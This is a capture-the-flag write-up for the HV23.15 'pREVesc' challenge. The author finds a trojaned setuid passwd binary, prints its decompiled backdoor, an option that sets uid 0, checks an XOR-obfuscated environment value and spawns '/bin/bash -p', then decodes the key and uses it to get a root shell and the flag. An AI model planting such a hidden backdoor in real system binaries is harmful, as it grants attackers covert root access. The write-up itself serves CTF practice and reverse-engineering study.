# [HV23.15] pREVesc

## Introduction

Difficulty: Hard<br>
Author: coderion

We recently changed the root password for santa as he always broke our system. However, I think he has hidden some backdoor in there. Please help us find it to save christmas!

## Solution

After loading linPEAS onto the machine and finding barely anything, I noticed a weird modification timestamp on the /usr/bin/passwd binary: <br>
`-rwsr-xr-x. 1 root root    132552 Dec 12 21:53  passwd`

So I downloaded it using `sftp` and started analyzing it in IDA.

Because I am a very skilled reverse-engineer I pressed the funny F5 button to get a nice decompile from it and the very first case stood out:

```c
case 'E':
    setuid(0);
    setgid(0);
    v7 = getenv("SALAMI");
    if ( !v7 )
    {
        puts("Why u givin' me no salami?!");
        exit(1);
    }
    *(_DWORD *)v134 = 68813853;
    v8 = 0LL;
    v136 = 7370101;
    *(_DWORD *)&v134[3] = 925444;
    si128 = _mm_load_si128((const __m128i *)&xmmword_141D0);
    do
    {
        v133[v8] = si128.m128i_i8[v8] ^ v134[v8];
        ++v8;
    }
    while ( v8 != 6 );
    v9 = 0LL;
    *(__m128i *)src = _mm_load_si128((const __m128i *)&xmmword_141E0);
    v138[0] = _mm_load_si128((const __m128i *)&xmmword_141F0);
    *(__m128i *)((char *)v138 + 11) = _mm_load_si128((const __m128i *)&xmmword_14200);
    do
    {
        s2[v9] = src[v9] ^ v133[(unsigned int)v9 % 6];
        ++v9;
    }
    while ( v9 != 43 );
    if ( strcmp(v7, s2) )
    {
        __printf_chk(1LL, "Never gonna give you up!\nYou'll never escape the rickroll.", v10);
        exit(1);
    }
    puts("Enjoy your salami!");
    system("/bin/bash -p");
    goto LABEL_35;
```

After also opening it up in BinaryNinja everything get's a bit clearer

```c
00005793                  case 0
00005793                      setuid(uid: 0)
0000579a                      setgid(gid: 0)
000057a6                      char* rax_16 = getenv(name: "SALAMI")
000057b1                      if (rax_16 == 0)
0000698d                          puts(str: "Why u givin' me no salami?!")
00006997                          exit(status: 1)
00006997                          noreturn
000057b7                      int32_t var_1ff = 0x41a041d
000057bf                      int64_t i = 0
000057e0                      var_1ff = 0xe1f04
000057e8                      int128_t var_1f8
000057e8                      __builtin_strcpy(dest: &var_1f8, src: "nevergonnagiveyouup")
00005802                      void var_205
00005802                      do
000057f7                          *(&var_205 + i) = *(&var_1ff + i) ^ *(&var_1f8 + i)
000057fa                          i = i + 1
000057fa                      while (i != 6)
0000580c                      int64_t i_1 = 0
00005820                      __builtin_memcpy(dest: &var_1d8, src: "\x1b\x15\x18\x11\x1e\x53\x5c\x4e\x1b\x16\x1a\x47\x0a\x0e\x19\x15\x18\x0b\x16\x4f\x0f\x0e\x00\x46\x04\x00\x18\x02\x05\x56\x05\x5c\x08\x30\x1a\x5d\x04\x58\x3b\x06\x35\x0a\x22", n: 0x2b)
0000586c                      do
00005860                          *(&var_108 + i_1) = *(&var_205 + sx.q(i_1.d u% 6)) ^ *(&var_1d8 + i_1)
00005864                          i_1 = i_1 + 1
00005864                      while (i_1 != 0x2b)
0000587b                      if (strcmp(rax_16, &var_108) != 0)
000058aa                          __printf_chk(flag: 1, format: "Never gonna give you up!\nYou'll…")
000058b4                          exit(status: 1)
000058b4                          noreturn
00005884                      puts(str: "Enjoy your salami!")
00005890                      system(line: "/bin/bash -p")
000057ae                      break
```

As expected a Rick Roll, but that is not all, let's inspect why we are getting RickRolled.

First we need to XOR `1d 04 1a 04 1f 0e` with `nevergonnagiveyouup`, which gives us `salami`, I guess the author really likes salami, we then use `salami` as an XOR key with the big byte array, which gives us `https://www.youtube.com/watch?v=dQw4w9WgXcQ`.

Fuck, rick rolled again - atleast that's what I thought at first, then I did the following:

```bash
export SALAMI=https://www.youtube.com/watch?v=dQw4w9WgXcQ
passwd -E
```

which gave me a root shell.

```
root@b75093f3-77ba-4e95-911f-5c51ad518ba8:/home/challenge# cat /root/flag.txt
HV23{3v1l_p455wd}
```

Flag: `HV23{3v1l_p455wd}`